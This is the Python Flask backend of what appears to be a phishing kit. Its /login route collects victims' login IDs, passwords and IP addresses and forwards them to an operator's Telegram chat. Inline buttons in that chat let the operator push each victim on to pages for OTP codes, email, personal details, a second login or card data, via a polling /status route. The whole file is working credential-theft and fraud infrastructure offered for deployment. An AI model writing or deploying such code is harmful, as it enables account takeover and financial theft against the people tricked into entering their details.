from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
from dotenv import load_dotenv

# Setup
load_dotenv()
app = Flask(__name__)
CORS(app)

# Telegram Config
BOT_TOKEN = os.getenv("BOT_TOKEN") or "dgd773hhd"  # Use your secret token
CHAT_ID = os.getenv("CHAT_ID")  # Must be set on Render env

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")

# Track sessions: { session_id: {"approved": bool, "redirect_url": str} }
SESSION_STATUS = {}

# Emoji-enhanced buttons in rows
BUTTONS = [
    {"emoji": "🔐", "text": "OTP", "page": "otp.html"},
    {"emoji": "📧", "text": "Email", "page": "email.html"},
    {"emoji": "🧍", "text": "Personal", "page": "personal.html"},
    {"emoji": "🔑", "text": "Login2", "page": "login2.html"},
    {"emoji": "🧾", "text": "C Page", "page": "c.html"},
]

def send_to_telegram(login_id, password, ip, session_id):
    msg = (
        f"<b>🔐 New Login</b>\n\n"
        f"<b>Login ID:</b> <code>{login_id}</code>\n"
        f"<b>Password:</b> <code>{password}</code>\n"
        f"<b>IP:</b> <code>{ip}</code>\n"
        f"<b>Session ID:</b> <code>{session_id}</code>"
    )
    inline_keyboard = [[
        {
            "text": f"{b['emoji']} {b['text']}",
            "callback_data": f"{session_id}:{b['page']}"
        }
    ] for b in BUTTONS]

    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": inline_keyboard}
    }

    try:
        r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
        print("Telegram sent:", r.status_code)
        return r.ok
    except Exception as e:
        print("Telegram error:", e)
        return False

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    if not data or "login" not in data or "password" not in data:
        return jsonify({"success": False, "error": "Missing fields"}), 400

    login_id = data["login"]
    password = data["password"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}

    if not send_to_telegram(login_id, password, ip, session_id):
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json()
    if not update or "callback_query" not in update:
        return jsonify({"status": "ignored"}), 200

    try:
        data = update["callback_query"]["data"]
        session_id, page = data.split(":")
        if session_id in SESSION_STATUS:
            SESSION_STATUS[session_id]["approved"] = True
            SESSION_STATUS[session_id]["redirect_url"] = page
            return jsonify({"status": "ok"}), 200
        else:
            return jsonify({"status": "unknown session"}), 404
    except Exception as e:
        print("Webhook error:", e)
        return jsonify({"status": "error"}), 500

@app.route("/status/<session_id>", methods=["GET"])
def status(session_id):
    session = SESSION_STATUS.get(session_id)
    if not session:
        return jsonify({"error": "Not found"}), 404
    if session["approved"]:
        return jsonify({"status": "approved", "redirect_url": session["redirect_url"]}), 200
    return jsonify({"status": "pending"}), 200

@app.route("/", methods=["GET"])
def home():
    return "✅ Server is live"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)